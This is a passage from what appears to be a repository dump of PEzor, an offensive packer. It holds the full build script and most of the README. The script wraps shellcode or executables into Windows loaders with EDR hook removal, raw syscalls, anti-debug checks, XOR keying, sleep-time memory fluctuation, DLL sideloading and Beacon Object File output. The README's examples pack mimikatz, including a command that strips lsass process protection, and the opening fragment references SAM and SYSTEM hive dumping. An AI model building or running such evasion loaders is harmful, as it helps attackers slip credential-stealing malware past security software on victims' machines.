/system:SystemBkup.hiv /sam:SamBkup.hiv\\\"\n\n# PEzor <-32|-64> [options...] <SHELLCODE>\n\nOPTIONS\n  -h                        Show usage and exits\n  -32                       Force 32-bit executable\n  -64                       Force 64-bit executable\n  -debug                    Generate a debug build\n  -unhook                   User-land hooks removal\n  -antidebug                Add anti-debug checks\n  -shellcode                Force shellcode detection\n  -syscalls                 Use raw syscalls [64-bit only] [Windows 10+ only]\n  -sgn                      Encode the provided shellcode with sgn\n  -text                     Store shellcode in .text section instead of .data\n  -rx                       Allocate RX memory for shellcode\n  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]\n  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)\n  -sleep=N                  Sleeps for N seconds before unpacking the shellcode\n  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)\n  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()\n  -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)\n  -dll-sideload=DLL         Generate a DLL that will proxy the execution to another library\n\nEXAMPLES\n  # 64-bit (self-inject RWX)\n  $ PEzor.sh shellcode.bin\n  # 64-bit (self-inject RX)\n  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 shellcode.bin\n  # 64-bit (self-inject)\n  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin\n  # 64-bit (raw syscalls)\n  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin\n  # 64-bit (fluctuate to READWRITE when sleeping)\n  $ PEzor.sh -fluctuate=RW shellcode.bin\n  # 64-bit (fluctuate to NOACCESS when sleeping)\n  $ PEzor.sh -fluctuate=NA shellcode.bin\n  # 64-bit (use environmental keying with GetComputerNameExA)\n  $ PEzor.sh -xorkey=MY-FQDN-MACHINE-NAME shellcode.bin\n  # 64-bit (beacon object file)\n  $ PEzor.sh -format=bof shellcode.bin\n  # 64-bit (beacon object file w/ cleanup)\n  $ PEzor.sh -format=bof -cleanup shellcode.bin\n  # 64-bit (dll)\n  $ PEzor.sh -format=dll shellcode.bin\n  # 64-bit (dll sideload)\n  $ PEzor.sh -format=dll -dll-sideload=version.dll shellcode.bin\n  # 64-bit (reflective dll)\n  $ PEzor.sh -format=reflective-dll shellcode.bin\n  # 64-bit (service exe)\n  $ PEzor.sh -format=service-exe shellcode.bin\n  # 64-bit (service dll)\n  $ PEzor.sh -format=service-dll shellcode.bin\n  # 64-bit (dotnet)\n  $ PEzor.sh -format=dotnet shellcode.bin\n  # 64-bit (dotnet-pinvoke)\n  $ PEzor.sh -format=dotnet-pinvoke shellcode.bin\n  # 64-bit (dotnet-createsection)\n  $ PEzor.sh -format=dotnet-createsection shellcode.bin\n  # 32-bit (self-inject)\n  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin\n  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)\n  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin\"\n}\n\nif [ $# -eq 0 ]; then\n    usage\n    exit 1\nfi\n\ncommand -v $CXX >/dev/null 2>&1 || { echo >&2 \"$CXX is missing from \\$PATH. Check https://github.com/tpoechtrager/wclang to learn how to install it\"; exit 1; }\ncommand -v $CC >/dev/null 2>&1 || { echo >&2 \"$CC is missing from \\$PATH. Check https://github.com/tpoechtrager/wclang to learn how to install it\"; exit 1; }\ncommand -v donut >/dev/null 2>&1 || { echo >&2 \"donut is missing from \\$PATH. Check https://github.com/TheWover/donut to learn how to install it\"; exit 1; }\ncommand -v sgn >/dev/null 2>&1 || { echo >&2 \"sgn is missing from \\$PATH. Check https://github.com/EgeBalci/sgn to learn how to install it\"; exit 1; }\ncommand -v mcs >/dev/null 2>&1 || { echo >&2 \"mcs is missing from \\$PATH. Re-run install.sh script\"; exit 1; }\ncommand -v xortool-xor >/dev/null 2>&1 || { echo >&2 \"xortool-xor is missing from \\$PATH. Re-run install.sh script\"; exit 1; }\n\nfor arg in \"$@\"\ndo\n    shift\n    case \"$arg\" in\n        -h|help)\n            usage\n            exit 0\n            ;;\n        -debug)\n            DEBUG=true\n            echo \"[?] Debug build enabled\"\n            ;;\n        -32)\n            BITS=32\n            FORCED_BITS=true\n            echo \"[?] Forcing 32-bit architecture\"\n            ;;\n        -64)\n            BITS=64\n            FORCED_BITS=true\n            echo \"[?] Forcing 64-bit architecture\"\n            ;;\n        -text)\n            TEXT=true\n            echo \"[?] Payload will be put in .text section\"\n            ;;\n        -self)\n            SELF=true\n            echo \"[?] Self-executing payload\"\n            ;;\n        -antidebug)\n            ANTIDEBUG=true\n            echo \"[?] Anti-debug enabled\"\n            ;;\n        -syscalls)\n            SYSCALLS=true\n            echo \"[?] Syscalls enabled\"\n            ;;\n        -unhook)\n            UNHOOK=true\n            echo \"[?] Unhook enabled\"\n            ;;\n        -shellcode)\n            IS_SHELLCODE=true\n            echo \"[?] Forcing shellcode detection\"\n            ;;\n        -cleanup)\n            CLEANUP=true\n            echo \"[?] Forcing shellcode detection\"\n            ;;\n        -sleep=*)\n            SLEEP=\"${arg#*=}\"\n            echo \"[?] Waiting $SLEEP seconds before executing the payload\"\n            ;;\n        -sgn)\n            echo '[?] Final shellcode will be encoded with sgn'\n            SGN=true\n            ;;\n        -rx)\n            echo '[?] Allocating RX memory for execution'\n            echo \"[*] Warning: -rx supports RX shellcode only\"\n            RX=true\n            ;;\n        -format=*)\n            OUTPUT_FORMAT=\"${arg#*=}\"\n            echo \"[?] Output format: $OUTPUT_FORMAT\"\n            ;;\n        -sdk=*)\n            SDK=\"${arg#*=}\"\n            echo \"[?] .NET SDK: $SDK\"\n            ;;\n        -fluctuate=*)\n            FLUCTUATE=\"${arg#*=}\"\n            echo \"[?] Fluctuate: $FLUCTUATE\"\n            ;;\n        -xorkey=*)\n            XOR_KEY=\"${arg#*=}\"\n            echo \"[?] XOR key: $XOR_KEY\"\n            ;;\n        -dll-sideload=*)\n            DLL_SIDELOAD=\"${arg#*=}\"\n            echo \"[?] DLL to sideload: $DLL_SIDELOAD\"\n            ;;\n        *)\n            echo \"[?] Processing $arg\"\n            ls $arg 1>/dev/null 2>&1 || { echo \"[x] ERROR: $arg doesn't exist\"; exit 1; }\n            BLOB=$arg\n            OUTPUT_DIR=$(dirname -- $BLOB)\n            break\n            ;;\n    esac\ndone\n\nif [ $IS_SHELLCODE = false ]; then\n    file $BLOB | grep -q ': data' && { IS_SHELLCODE=true; }\n    file $BLOB | grep -q ': DOS executable (COM)' && { IS_SHELLCODE=true; } # false positive\nfi\n\nif [ $FORCED_BITS = false ]; then\n    file $BLOB | grep -vq 'x86-64' && file $BLOB | grep -q 'PE32' && { BITS=32; }\nfi\n\nif [ $BITS -eq 32 ] && [ $SYSCALLS = true ]; then\n    echo '[x] Error: cannot inline syscalls with 32bits applications'\n    exit 1\nfi\n\nif [[ $OUTPUT_FORMAT == dotnet* ]] && [ $SYSCALLS = true ]; then\n    echo '[x] Error: cannot inline syscalls when targeting .NET'\n    exit 1\nfi\n\nif [[ $OUTPUT_FORMAT == bof ]] && [ $UNHOOK = true ]; then\n    echo '[x] Error: cannot unhook when targeting BOFs'\n    exit 1\nfi\n\nif [[ $OUTPUT_FORMAT == bof ]] && [ $SELF = true ]; then\n    echo '[x] Error: cannot self-execute when targeting BOFs'\n    exit 1\nfi\n\nif [ $RX = true ] && [ $SGN = true ]; then\n    echo '[x] Error: cannot encode the shellcode when self-executing the payload'\n    exit 1\nfi\n\nif [ $SELF = true ] && [ $OUTPUT_FORMAT == \"dll\" -o $OUTPUT_FORMAT == \"service-dll\" -o $OUTPUT_FORMAT == \"reflective-dll\"]; then\n    echo '[x] Error: cannot self-execute the payload when targeting DLLs'\n    exit 1\nfi\n\nif [ $IS_SHELLCODE = true ]; then\n    echo '[?] Shellcode detected'\n    IS_SHELLCODE=true\nelse\n    echo -n '[?] PE detected: '\n    file $BLOB\nfi\n\nrm -f $TMP_DIR/{shellcode,sleep}.cpp{,donut} $TMP_DIR/{ApiSetMap,loader}.o $TMP_DIR/Global.cs\n\ncase $OUTPUT_FORMAT in\n    exe)\n        echo '[?] Building executable'\n        OUTPUT_EXTENSION=exe\n        ;;\n    dll)\n        echo '[?] Building shared library'\n        OUTPUT_EXTENSION=dll\n        ;;\n    reflective-dll)\n        echo '[?] Building reflective shared library'\n        OUTPUT_EXTENSION=reflective.dll\n        ;;\n    service-exe)\n        echo '[?] Building service executable'\n        OUTPUT_EXTENSION=service.exe\n        ;;\n    service-dll)\n        echo '[?] Building service shared library'\n        OUTPUT_EXTENSION=service.dll\n        ;;\n    dotnet*)\n        echo '[?] Building .NET executable'\n        OUTPUT_EXTENSION=dotnet.exe\n        ;;\n    bof)\n        echo '[?] Building Beacon Object File (BOF)'\n        if [ $BITS -eq 32 ]; then\n            OUTPUT_EXTENSION=x86.o\n        else\n            OUTPUT_EXTENSION=x64.o\n        fi\n        ;;\nesac\n\ncase $OUTPUT_FORMAT in\n    exe | dll | reflective-dll | service-exe | service-dll | bof)\n        echo \"unsigned int sleep_time = $SLEEP;\" > $TMP_DIR/sleep.cpp\n        if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then\n            echo '[?] Executing donut' &&\n            (donut -i $BLOB -o $TMP_DIR/shellcode.bin.donut \"$@\" && ls $TMP_DIR/shellcode.bin.donut 1>/dev/null 2>&1) &&\n            echo '#pragma clang diagnostic ignored \"-Woverlength-strings\"' >> $TMP_DIR/shellcode.cpp &&\n            if [ $TEXT = true ]; then echo '__attribute__((section (\".text\")))' >> $TMP_DIR/shellcode.cpp; fi &&\n            echo -n 'unsigned char buf[] = \"' >> $TMP_DIR/shellcode.cpp &&\n            if [ $XOR_KEY != false ]; then\n                xortool-xor -r $XOR_KEY -n -f $TMP_DIR/shellcode.bin.donut > $TMP_DIR/shellcode.bin.donut.xor\n            else\n                cp $TMP_DIR/shellcode.bin.donut $TMP_DIR/shellcode.bin.donut.xor\n            fi &&\n            od -vtx1 $TMP_DIR/shellcode.bin.donut.xor | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\\\x/g' | tr -d '\\n' >> $TMP_DIR/shellcode.cpp &&\n            echo '\";' >> $TMP_DIR/shellcode.cpp &&\n            echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1\n        else\n            if [ $IS_SHELLCODE = false ]; then\n                echo '[?] Executing donut' &&\n                (donut -i $BLOB -o $TMP_DIR/shellcode.bin.donut \"$@\" && ls $TMP_DIR/shellcode.bin.donut 1>/dev/null 2>&1)\n            else\n                cp $BLOB $TMP_DIR/shellcode.bin.donut\n            fi &&\n\n            if [ $SGN = true ]; then\n                echo '[?] Executing sgn' &&\n                (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1)\n            else\n                cp $TMP_DIR/shellcode.bin.donut $TMP_DIR/shellcode.bin\n            fi &&\n\n            if [ $XOR_KEY != false ]; then\n                xortool-xor -r $XOR_KEY -n -f $TMP_DIR/shellcode.bin > $TMP_DIR/shellcode.bin.xor\n            else\n                cp $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.xor\n            fi &&\n\n            echo '#pragma clang diagnostic ignored \"-Woverlength-strings\"' >> $TMP_DIR/shellcode.cpp &&\n            if [ $TEXT = true ]; then echo '__attribute__((section (\".text\")))' >> $TMP_DIR/shellcode.cpp; fi &&\n            echo -n 'unsigned char buf[] = \"' >> $TMP_DIR/shellcode.cpp &&\n            od -vtx1 $TMP_DIR/shellcode.bin.xor | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\\\x/g' | tr -d '\\n' >> $TMP_DIR/shellcode.cpp &&\n            echo '\";' >> $TMP_DIR/shellcode.cpp &&\n            echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1\n        fi &&\n\n        if [[ ( $OUTPUT_FORMAT = \"exe\" || $OUTPUT_FORMAT = \"service-exe\" ) && $DEBUG = false ]]; then\n            CCFLAGS=\"-O3 -Wl,-strip-all,-subsystem=windows -Wall -pedantic\"\n            CPPFLAGS=\"-O3 -Wl,-strip-all,-subsystem=windows -Wall -pedantic\"\n        else\n            CCFLAGS=\"-O3 -Wl,-strip-all, -Wall -pedantic\"\n            CPPFLAGS=\"-O3 -Wl,-strip-all, -Wall -pedantic\"\n        fi &&\n\n        if [ $BITS -eq 32 ]; then\n            CC=i686-w64-mingw32-clang\n            CXX=i686-w64-mingw32-clang++\n            CCFLAGS=\"$CCFLAGS -m32 -DWIN_X86\"\n            CPPFLAGS=\"$CPPFLAGS -m32 -DWIN_X86\"\n        else\n            CCFLAGS=\"$CCFLAGS -D_WIN64 -DWIN_X64\"\n            CPPFLAGS=\"$CPPFLAGS -D_WINX64 -DWIN_X64\"\n        fi &&\n\n        if [ $DEBUG = true ]; then\n            CCFLAGS=\"$CCFLAGS -D_DEBUG_\"\n            CPPFLAGS=\"$CPPFLAGS -D_DEBUG_\"\n        fi &&\n\n        if [ $SYSCALLS = true ]; then\n            CCFLAGS=\"$CCFLAGS -DSYSCALLS\"\n            CPPFLAGS=\"$CPPFLAGS -DSYSCALLS\"\n        fi &&\n\n        if [ $UNHOOK = true ]; then\n            CCFLAGS=\"$CCFLAGS -DUNHOOK\"\n            CPPFLAGS=\"$CPPFLAGS -DUNHOOK\"\n        fi &&\n\n        if [ $ANTIDEBUG = true ]; then\n            CCFLAGS=\"$CCFLAGS -DANTIDEBUG\"\n            CPPFLAGS=\"$CPPFLAGS -DANTIDEBUG\"\n        fi &&\n\n        if [ $SELF = true ]; then\n            CCFLAGS=\"$CCFLAGS -DSELFINJECT\"\n            CPPFLAGS=\"$CPPFLAGS -DSELFINJECT\"\n        fi &&\n\n        if [ $RX = true ]; then\n            CCFLAGS=\"$CCFLAGS -DRX\"\n            CPPFLAGS=\"$CPPFLAGS -DRX\"\n        fi &&\n\n        if [ $TEXT = true ]; then\n            CCFLAGS=\"$CCFLAGS -D_TEXT_\"\n            CPPFLAGS=\"$CPPFLAGS -D_TEXT_\"\n        fi &&\n\n        if [ $CLEANUP = true ]; then\n            CCFLAGS=\"$CCFLAGS -D_CLEANUP_\"\n            CPPFLAGS=\"$CPPFLAGS -D_CLEANUP_\"\n        fi &&\n\n        if [ $FLUCTUATE = \"rw\" ] || [ $FLUCTUATE = \"RW\" ]; then\n            CCFLAGS=\"$CCFLAGS -DFLUCTUATE -DFLUCTUATE_RW\"\n            CPPFLAGS=\"$CPPFLAGS -DFLUCTUATE -DFLUCTUATE_RW\"\n        elif [ $FLUCTUATE = \"na\" ] || [ $FLUCTUATE = \"NA\" ]; then\n            CCFLAGS=\"$CCFLAGS -DFLUCTUATE -DFLUCTUATE_NA\"\n            CPPFLAGS=\"$CPPFLAGS -DFLUCTUATE -DFLUCTUATE_NA\"\n        fi &&\n\n        if [ $XOR_KEY != false ]; then\n            CCFLAGS=\"$CCFLAGS -DXOR_KEY=\\\"$XOR_KEY\\\"\"\n            CPPFLAGS=\"$CPPFLAGS -DXOR_KEY=\\\"$XOR_KEY\\\"\"\n        fi &&\n\n        if [ $OUTPUT_FORMAT = \"dll\" ]; then\n            CCFLAGS=\"$CCFLAGS -shared -DSHAREDOBJECT\"\n            CPPFLAGS=\"$CPPFLAGS -shared -DSHAREDOBJECT\"\n        elif [ $OUTPUT_FORMAT = \"reflective-dll\" ]; then\n            CCFLAGS=\"$CCFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN\"\n            CPPFLAGS=\"$CPPFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN\"\n        elif [ $OUTPUT_FORMAT = \"service-exe\" ]; then\n            CCFLAGS=\"$CCFLAGS -DSERVICE_EXE\"\n            CPPFLAGS=\"$CPPFLAGS -DSERVICE_EXE\"\n        elif [ $OUTPUT_FORMAT = \"service-dll\" ]; then\n            CCFLAGS=\"$CCFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL\"\n            CPPFLAGS=\"$CPPFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL\"\n        elif [ $OUTPUT_FORMAT = \"bof\" ]; then\n            CCFLAGS=\"$CCFLAGS -c -D_BOF_\"\n            CPPFLAGS=\"$CPPFLAGS -c -D_BOF_\"\n        fi &&\n\n        if [ $OUTPUT_FORMAT = \"reflective-dll\" ]; then\n            $CC $CCFLAGS -c $INSTALL_DIR/ReflectiveDLLInjection/dll/src/ReflectiveLoader.c -o $TMP_DIR/ReflectiveLoader.o\n            SOURCES=\"$SOURCES $TMP_DIR/ReflectiveLoader.o\"\n        fi &&\n\n        if [ $UNHOOK = true ] || [ $ANTIDEBUG = true ]; then\n            $CC $CCFLAGS -c $INSTALL_DIR/ApiSetMap.c -o $TMP_DIR/ApiSetMap.o &&\n            SOURCES=\"$SOURCES $TMP_DIR/ApiSetMap.o\"\n        fi &&\n\n        if [ $UNHOOK = true ]; then\n            $CC $CCFLAGS -c $INSTALL_DIR/loader.c -o $TMP_DIR/loader.o &&\n            SOURCES=\"$SOURCES $TMP_DIR/loader.o\"\n        fi &&\n\n        if [ $FLUCTUATE = \"rw\" ] || [ $FLUCTUATE = \"RW\" ] || [ $FLUCTUATE = \"na\" ] || [ $FLUCTUATE = \"NA\" ]; then\n            SOURCES=\"$SOURCES $INSTALL_DIR/fluctuate.cpp\"\n        fi &&\n\n        if [ $OUTPUT_FORMAT = \"dll\" -o $OUTPUT_FORMAT = \"service-dll\" -o $OUTPUT_FORMAT == \"reflective-dll\" ] && [ $DLL_SIDELOAD != false ]; then\n            SOURCES=\"$SOURCES $TMP_DIR/sideload.def\"\n            ORIGINAL_DLL=$(basename -- \"$DLL_SIDELOAD\")\n            original_dll_name=\"${ORIGINAL_DLL%.*}\"\n            new_dll=\"$original_dll_name\"\"$RANDOM\"\n            NEW_DLL_NAME=\"$new_dll.dll\"\n            winedump dump -C -j export \"$DLL_SIDELOAD\" | \\\n            awk '\n                BEGIN {\n                    print \"EXPORTS\"\n                }\n                /Entry/,/Done/ {\n                    if ($2 ~ /^[0-9]+/) {\n                        ordinal = $2\n                        name = $3\n                        new_dll = \"'${new_dll}'\"\n                        if (name ~ /</) { \n                            # Exported by ordinal (TODO: syntax error in .def file)\n                            # printf \"    @%s=%s.#%s @%s\\n\", ordinal, new_dll, ordinal, ordinal\n                        } else if (name !~ /DllMain/){\n                            # Exported function with a name\n                            printf \"    %s=%s.%s @%s\\n\", name, new_dll, name, ordinal\n                        }\n                    }                            \n                }\n            ' > $TMP_DIR/sideload.def || exit 1\n        fi &&\n\n        if [ $OUTPUT_FORMAT = \"bof\" ]; then\n            # $CXX $CPPFLAGS $CXXFLAGS -Wl,--disable-auto-import -Wl,--disable-runtime-pseudo-reloc $TMP_DIR/shellcode.cpp -c -o $TMP_DIR/shellcode.o\n            # $CXX $CPPFLAGS $CXXFLAGS $TMP_DIR/sleep.cpp -c -o $TMP_DIR/sleep.o &&\n            # $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/inject.cpp -c -o $TMP_DIR/inject.o &&\n            CXXFLAGS=\"-std=c++17 -static\"\n            grep -v '#include \"inject.hpp\"' $INSTALL_DIR/inject.cpp > $TMP_DIR/inject.cpp &&\n            cat $TMP_DIR/{shellcode,sleep}.cpp $INSTALL_DIR/bof.cpp $TMP_DIR/inject.cpp > $TMP_DIR/bof.cpp &&\n            cp $INSTALL_DIR/{sleep,inject,syscalls}.hpp $INSTALL_DIR/beacon.h $TMP_DIR &&\n            mkdir -p $TMP_DIR/deps/inline_syscall/include &&\n            cp $INSTALL_DIR/deps/inline_syscall/include/* $TMP_DIR/deps/inline_syscall/include &&\n            $CXX -mno-stack-arg-probe $CPPFLAGS $CXXFLAGS $TMP_DIR/bof.cpp -c -o $BLOB.packed.$OUTPUT_EXTENSION || exit 1\n            # x86_64-w64-mingw32-ld -r $TMP_DIR/{sleep,bof,inject}.o -o $BLOB.packed.$OUTPUT_EXTENSION\n        else\n            CXXFLAGS=\"-std=c++17 -static\"\n            echo $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/{inject,PEzor}.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $BLOB.packed.$OUTPUT_EXTENSION &&\n            $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/{inject,PEzor}.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $BLOB.packed.$OUTPUT_EXTENSION &&\n            strip $BLOB.packed.$OUTPUT_EXTENSION || exit 1\n        fi\n        ;;\n    dotnet*)\n        DOTNET_FLAGS=\"-unsafe -debug-\"\n        echo 'public static class Global {' >> $TMP_DIR/Global.cs &&\n        echo \"public static int sleep_time = $SLEEP;\" >> $TMP_DIR/Global.cs &&\n        echo -n 'public static ' >> $TMP_DIR/Global.cs &&\n        if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then\n            echo '[?] Executing donut' &&\n            (donut -i $BLOB -f 7 -o $TMP_DIR/shellcode.cs \"$@\" && ls $TMP_DIR/shellcode.cs 1>/dev/null 2>&1) &&\n            cat $TMP_DIR/shellcode.cs >> $TMP_DIR/Global.cs\n        else\n            if [ $IS_SHELLCODE = false ]; then\n                echo '[?] Executing donut' &&\n                (donut -i $BLOB -o $TMP_DIR/shellcode.bin.donut \"$@\" && ls $TMP_DIR/shellcode.bin.donut 1>/dev/null 2>&1)\n            else\n                cp $BLOB $TMP_DIR/shellcode.bin.donut\n            fi &&\n\n            if [ $SGN = true ]; then\n                echo '[?] Executing sgn' &&\n                (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1)\n            else\n                cp $TMP_DIR/shellcode.bin.donut $TMP_DIR/shellcode.bin\n            fi &&\n\n            echo -n 'byte[] my_buf = {' >> $TMP_DIR/Global.cs &&\n            od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /,0x/g' -e 's/^,//g' | sed -z -e 's/\\n/,/g' -e 's/,$//g' >> $TMP_DIR/Global.cs &&\n            echo -n '};' >> $TMP_DIR/Global.cs\n        fi &&\n        echo '}' >> $TMP_DIR/Global.cs &&\n\n        if [ ! $SDK = \"4.5\" ]; then\n            DOTNET_FLAGS=\"$DOTNET_FLAGS -sdk:$SDK\"\n        fi &&\n\n        if [ $BITS -eq 32 ]; then\n            DOTNET_FLAGS=\"$DOTNET_FLAGS -platform:x86\"\n        else\n            DOTNET_FLAGS=\"$DOTNET_FLAGS -platform:x64\"\n        fi &&\n\n        if [ $DEBUG = true ]; then\n            DOTNET_FLAGS=\"$DOTNET_FLAGS -define:_DEBUG_\"\n        fi &&\n\n        if [ $SELF = true ]; then\n            DOTNET_FLAGS=\"$DOTNET_FLAGS -define:SELFINJECT\"\n        fi &&\n\n        if [ $RX = true ]; then\n            DOTNET_FLAGS=\"$DOTNET_FLAGS -define:RX\"\n        fi &&\n\n        case $OUTPUT_FORMAT in\n        dotnet)\n            mcs $DOTNET_FLAGS -out:$BLOB.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/*.cs $TMP_DIR/Global.cs\n            ;;\n        dotnet-pinvoke)\n            DOTNET_FLAGS=\"$DOTNET_FLAGS -define:PINVOKE\"\n            mcs $DOTNET_FLAGS -out:$BLOB.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/Program.cs $TMP_DIR/Global.cs\n            ;;\n        dotnet-createsection)\n            DOTNET_FLAGS=\"$DOTNET_FLAGS -define:MAPVIEWOFSECTION\"\n            mcs $DOTNET_FLAGS -out:$BLOB.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/*.cs $TMP_DIR/Global.cs\n            ;;\n        esac\n        ;;\nesac &&\n\n#rm -rf $TMP_DIR &&\necho -n '[!] Done! Check '; file $BLOB.packed.$OUTPUT_EXTENSION &&\nif [ $OUTPUT_FORMAT = \"dll\" -o $OUTPUT_FORMAT = \"service-dll\" -o $OUTPUT_FORMAT == \"reflective-dll\" ] && [ $DLL_SIDELOAD != false ]; then\n    cp \"$DLL_SIDELOAD\" \"$OUTPUT_DIR/$NEW_DLL_NAME\" &&\n    echo \"[?] Rename $BLOB.packed.$OUTPUT_EXTENSION to $ORIGINAL_DLL and copy in the same directory $NEW_DLL_NAME\"\nfi\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 10.0341796875,
          "content": "PEzor\n=====\n\nRead the blog posts here:\n\n- [https://iwantmore.pizza/posts/PEzor.html](https://iwantmore.pizza/posts/PEzor.html)\n- [https://iwantmore.pizza/posts/PEzor2.html](https://iwantmore.pizza/posts/PEzor2.html)\n- [https://iwantmore.pizza/posts/PEzor3.html](https://iwantmore.pizza/posts/PEzor3.html)\n- [https://iwantmore.pizza/posts/PEzor4.html](https://iwantmore.pizza/posts/PEzor4.html)\n\n```raw\n ________________\n< PEzor!! v3.3.0 >\n ----------------\n      \\                    / \\  //\\\n       \\    |\\___/|      /   \\//  \\\\\n            /0  0  \\__  /    //  | \\ \\\n           /     /  \\/_/    //   |  \\  \\\n           @_^_@'/   \\/_   //    |   \\   \\\n           //_^_/     \\/_ //     |    \\    \\\n        ( //) |        \\///      |     \\     \\\n      ( / /) _|_ /   )  //       |      \\     _\\\n    ( // /) '/,_ _ _/  ( ; -.    |    _ _\\.-~        .-~~~^-.\n  (( / / )) ,-{        _      `-.|.-~-.           .~         `.\n (( // / ))  '/\\      /                 ~-. _ .-~      .-~^-.  \\\n (( /// ))      `.   {            }                   /      \\  \\\n  (( / ))     .----~-.\\        \\-'                 .~         \\  `. \\^-.\n             ///.----..>        \\             _ -~             `.  ^-`  ^-_\n               ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~\n                                                                  /.-~\n---------------------------------------------------------------------------\n```\n\n<!-- toc -->\n* [Installation](#installation)\n* [Usage](#usage)\n<!-- tocstop -->\n\n<!-- install -->\n# Installation\nThe `install.sh` is designed to work on a Kali Linux distro.\n```sh-session\n$ git clone https://github.com/phra/PEzor.git\n$ cd PEzor\n$ sudo bash install.sh\n$ bash PEzor.sh -h\n```\n\n# ~Upgrading from v2.x.x~\n\n~The `PATH` variable has to be updated to use a specific commit of [Donut](https://github.com/TheWover/donut)! Check the updated `install.sh` script.~\n\n<!-- installstop -->\n\n<!-- usage -->\n# Usage\n* [`PEzor -h`](#PEzor-help)\n* [`PEzor <EXECUTABLE> [donut args...]`](#PEzor-executable)\n* [`PEzor <SHELLCODE>`](#PEzor-shellcode)\n<!-- usagestop -->\n\n<!-- pezor-help -->\n## `PEzor help`\n\ndisplay help for PEzor\n\n```\nUSAGE\n  $ PEzor help\n```\n<!-- pezor-helpstop -->\n\n<!-- pezor-executable -->\n## `PEzor <EXECUTABLE>`\n\nPack the provided executable into a new one\n\n```\nOPTIONS\n  -h                        Show usage and exits\n  -32                       Force 32-bit executable\n  -64                       Force 64-bit executable\n  -debug                    Generate a debug build\n  -unhook                   User-land hooks removal\n  -antidebug                Add anti-debug checks\n  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]\n  -sgn                      Encode the generated shellcode with sgn\n  -text                     Store shellcode in .text section instead of .data\n  -rx                       Allocate RX memory for shellcode\n  -self                     Execute the shellcode in the same thread\n  -sdk=VERSION              Use specified .NET Framework version (2, 4, 4.5 (default))\n  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)\n  -sleep=N                  Sleeps for N seconds before unpacking the shellcode\n  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)\n  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()\n  -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)\n  [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2\n\nEXAMPLES\n  # 64-bit (self-inject RWX)\n  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2\n  # 64-bit (self-inject RX)\n  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2\n  # 64-bit (raw syscalls)\n  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2\n  # 64-bit (fluctuate to READWRITE when sleeping)\n  $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'\n  # 64-bit (fluctuate to NOACCESS when sleeping)\n  $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'\n  # 64-bit (use environmental keying with GetComputerNameExA)\n  $ PEzor.sh -xorkey=MY-FQDN-COMPUTER-NAME -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'\n  # 64-bit (support EXEs with resources by keeping PE headers in memory)\n  $ PEzor.sh -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -k 2 -p '\"!+\" \"!processprotect\" \"/process:lsass.exe\" \"/remove\" \"!-\" \"exit\"'\n  # 64-bit (beacon object file)\n  $ 